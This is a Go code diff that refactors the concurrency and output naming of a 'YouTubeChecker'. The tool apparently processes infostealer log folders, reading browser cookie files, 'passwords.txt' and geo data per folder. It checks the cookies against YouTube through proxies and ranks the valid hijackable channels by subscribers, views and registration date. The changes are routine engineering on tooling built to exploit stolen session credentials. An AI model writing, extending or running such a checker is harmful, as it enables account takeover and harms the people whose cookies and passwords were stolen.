@@ -58,74 +58,83 @@ func (yt *YouTubeChecker) CheckFolder(checkPath, savePath string, updatesChan ch
 	}
 
 	checkControl := &models.CheckedAmount{}
-	resultChan := make(chan *models.CookieInfo, len(checkContent)*50)
-	for _, folder := range checkContent {
-		if !folder.IsDir() {
-			continue
-		}
-		folderPath := path.Join(checkPath, folder.Name())
+	resultChan := make(chan *models.CookieInfo, 10)
 
-		var txts []string
-		err := filepath.Walk(folderPath, func(path string, info fs.FileInfo, err error) error {
-			if filepath.Ext(path) == ".txt" && strings.Contains(strings.ToLower(path), "browsers/cookies") {
-				txts = append(txts, path)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+
+		var innerWg sync.WaitGroup
+		for _, folder := range checkContent {
+			if !folder.IsDir() {
+				continue
+			}
+			folderPath := path.Join(checkPath, folder.Name())
+
+			var txts []string
+			err := filepath.Walk(folderPath, func(path string, info fs.FileInfo, err error) error {
+				if filepath.Ext(path) == ".txt" && strings.Contains(strings.ToLower(path), "cookies") {
+					txts = append(txts, path)
+				}
+
 				return nil
-			}
-
-			if filepath.Ext(path) == ".txt" && strings.Contains(strings.ToLower(path), "cookies") {
-				txts = append(txts, path)
-			}
-
-			return nil
-		})
-		if err != nil {
-			return
-		}
-
-		geo, err := yt.getGeo(folderPath)
-		if err != nil {
-			return
-		}
-
-		for _, txt := range txts {
-
-			if !strings.Contains(strings.ToLower(txt), "cookies") {
-				continue
-			}
-
-			cookies, err := yt.cookiesFromTxt(txt)
+			})
 			if err != nil {
-				upd := models.Update{Type: models.ErrorNotifyType, Err: err}
+				return
+			}
+
+			geo, err := yt.getGeo(folderPath)
+			if err != nil {
+				return
+			}
+
+			for _, txt := range txts {
+
+				if !strings.Contains(strings.ToLower(txt), "cookies") {
+					continue
+				}
+
+				cookies, err := yt.cookiesFromTxt(txt)
+				if err != nil {
+					upd := models.Update{Type: models.ErrorNotifyType, Err: err}
+					updatesChan <- upd
+					continue
+				}
+
+				if len(cookies) == 0 {
+					continue
+				}
+
+				if err := yt.setClient(proxies); err != nil {
+					upd := models.Update{Type: models.ErrorNotifyType, Err: err}
+					updatesChan <- upd
+				}
+
+				innerWg.Add(1)
+				go func(cookies []*http.Cookie, cookiesPath, txtPath string) {
+					defer innerWg.Done()
+
+					yt.Client.CheckCookies(cookies, geo, folderPath, txtPath, checkControl, updatesChan, resultChan)
+
+				}(cookies, folderPath, txt)
+				checkControl.Checked++
+
+				upd := models.Update{Type: models.CheckStatusType, Data: *checkControl}
 				updatesChan <- upd
-				continue
+				runtime.GC()
 			}
-
-			if len(cookies) == 0 {
-				continue
-			}
-
-			if err := yt.setClient(proxies); err != nil {
-				upd := models.Update{Type: models.ErrorNotifyType, Err: err}
-				updatesChan <- upd
-			}
-
-			wg.Add(1)
-			go func(cookies []*http.Cookie, cookiesPath, txtPath string) {
-				defer wg.Done()
-
-				yt.Client.CheckCookies(cookies, geo, folderPath, txtPath, checkControl, updatesChan, resultChan)
-
-			}(cookies, folderPath, txt)
-			checkControl.Checked++
-
-			upd := models.Update{Type: models.CheckStatusType, Data: *checkControl}
-			updatesChan <- upd
-			runtime.GC()
 		}
+		innerWg.Wait()
+		close(resultChan)
+	}()
+
+	for result := range resultChan {
+		yt.sortByPath(result)
+		yt.sortByTxt(result)
 	}
+
 	wg.Wait()
 	fmt.Println(time.Now().Sub(s))
-	close(resultChan)
 
 	upd := models.Update{Type: models.SavingValidType, Data: "Saving valid"}
 	updatesChan <- upd
@@ -136,13 +145,10 @@ func (yt *YouTubeChecker) CheckFolder(checkPath, savePath string, updatesChan ch
 	}
 
 	//TODO горутины
-	for result := range resultChan {
-		yt.sortByPath(result)
-		yt.sortByTxt(result)
-	}
 
 	if err := yt.saveValidLogs(checkPath, savePath); err != nil {
-		//
+		upd := models.Update{Type: models.ErrorNotifyType, Err: SaveError}
+		updatesChan <- upd
 	}
 	fmt.Printf("FINISHED %d/%d FOR %v\n", checkControl.Valid, checkControl.Checked, time.Now().Sub(s))
 	close(updatesChan)
@@ -247,16 +253,27 @@ func (yt *YouTubeChecker) saveValidLogs(checkPath, savePath string) error {
 }
 
 func (yt *YouTubeChecker) formSaveFolderName(logPath string) string {
-	var subs, views int
+	var date time.Time
 
+	subs, views, i := 0, 0, 0
 	if channels, ok := channelsInLog[logPath]; ok {
 		for _, channel := range channels {
+			if i == 0 {
+				date, _ = time.Parse("Jan 2, 2006", channel.RegDate)
+				i++
+			}
+			currentDate, _ := time.Parse("Jan 2, 2006", channel.RegDate)
+
+			if date.After(currentDate) {
+				date = currentDate
+			}
+
 			subs = subs + channel.Subscribes
 			views = views + channel.ViewsCount
 		}
 	}
 
-	return fmt.Sprintf("[%d subs] [%d views] [%d channels] %s", subs, views, len(channelsInLog[logPath]), strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/")[len(strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/"))-1])
+	return fmt.Sprintf("[%d subs] [%d views] [%v] [%d channels] %s", subs, views, date, len(channelsInLog[logPath]), strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/")[len(strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/"))-1])
 }
 
 func (yt *YouTubeChecker) countCookieTotal(info []*models.CookieInfo) (int, int) {
@@ -438,7 +455,6 @@ func (yt *YouTubeChecker) findPassword(cookiePath string) (string, error) {
 		if strings.ToLower(file.Name()) == "passwords.txt" {
 			content, err := os.ReadFile(path.Join(cookiePath, file.Name()))
 			if err != nil {
-				fmt.Println(err)
 				continue
 			}
 			lines := strings.Split(string(content), "\n")
@@ -503,6 +519,7 @@ func (yt *YouTubeChecker) clearCheckHistory() {
 }
 
 func (yt *YouTubeChecker) setClient(proxies []models.Proxy) error {
+
 	if len(proxies) == 0 {
 		yt.Client = client.NewClient(nil)
 		return nil
